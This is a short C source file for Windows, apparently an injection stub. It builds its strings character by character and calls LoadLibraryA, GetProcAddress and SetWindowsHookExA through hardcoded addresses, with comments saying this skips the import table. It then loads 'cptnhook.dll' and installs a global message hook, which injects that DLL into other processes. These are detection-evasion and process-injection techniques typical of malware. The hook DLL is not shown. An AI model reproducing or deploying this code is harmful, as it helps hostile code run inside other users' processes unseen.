#include "windows.h"

DWORD WINAPI InjectMe(LPVOID lpParameter){
	typedef HMODULE(*_LoadLibrary)(LPCSTR);
	typedef FARPROC(*_GetProcAddress)(HMODULE,LPCSTR);
	typedef FARPROC(*_SetWindowsHookEx)(int , HOOKPROC, HINSTANCE, DWORD);

	char hookProc[] = {'H','o','o','k','P','r','o','c',0};
	char cpnHook[] = { 'c','p','t','n','h','o','o','k','.','d','l','l',0};

	_LoadLibrary ll;
	HMODULE hMod;
	_GetProcAddress gpa;
	HOOKPROC installProc;
	_SetWindowsHookEx swh;

	//0x7c801d7b - LoadLibraryA - Skip IAT
	ll = (_LoadLibrary)0x7c801d7b;
	hMod = ll(cpnHook);
	if (NULL == hMod){
		return -1;
	}

	//0x7c80ae40 - GetProcAddress - Skip IAT
	gpa = (_GetProcAddress)0x7c80ae40;

	installProc = (HOOKPROC)gpa(hMod,hookProc);
	if (NULL == installProc){
		return -2;
	}

	//0x7e431211 - SetWindowsHookExA - Skip IAT
	swh = (_SetWindowsHookEx)0x7e431211;
	swh(WH_GETMESSAGE, installProc, hMod, 0);
	return 0;
	
}
int main (){return InjectMe((LPVOID)NULL);}